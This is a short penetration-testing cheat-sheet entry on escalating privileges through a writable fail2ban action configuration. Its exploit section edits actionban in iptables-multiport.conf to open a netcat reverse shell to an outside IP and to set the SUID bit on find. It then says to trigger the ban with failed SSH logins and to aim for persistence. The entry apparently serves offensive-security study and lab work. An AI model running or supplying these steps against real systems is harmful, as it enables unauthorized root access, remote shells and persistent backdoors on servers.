# fail2ban

Fail2Ban is an IPS framework that protects computer servers from brute-force attacks.

## Interesting Paths

```
# log file path
- /var/log/fail2ban.log
```

## Privilege Escalation Requirement

```
# should be writable
/etc/fail2ban/action.d/*
```

## Exploit

[https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)

```
# check if writable
$ ls -la iptables-multiport.conf

# this file has 2 actions: actionban & actionunban
# update actionban = <sticky-bandit>
actionban = /usr/bin/nc -e /bin/bash 192.168.49.122 9000
            chmod +s /usr/bin/find

# force ssh in as user and actionban will execute
# default actionban is for 1 minute; so rev-shell will die in 1 min; try for persistence
```
